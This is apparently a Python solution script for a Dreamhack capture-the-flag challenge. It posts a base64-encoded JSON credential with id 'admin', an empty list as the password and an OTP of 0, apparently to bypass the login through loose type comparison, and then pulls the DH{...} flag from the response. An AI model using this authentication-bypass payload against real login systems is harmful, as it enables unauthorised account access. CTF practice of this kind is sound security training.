import requests
import json
import base64
import re

url = 'http://host3.dreamhack.games:9035/'
payload = {
    "id": "admin",
    "pw": [],
    "otp": 0
}
data = {'cred': base64.b64encode(json.dumps(payload).encode()).decode()}
resp = requests.post(url, data=data)
 # 응답에서 플래그 값 추출
flag_match = re.search(r'(DH\{.*?\})', resp.text)
if flag_match:
    flag_value = flag_match.group(1)
    print(f"Flag Value: {flag_value}")
else:
    print("Failed to obtain flag from the response.")

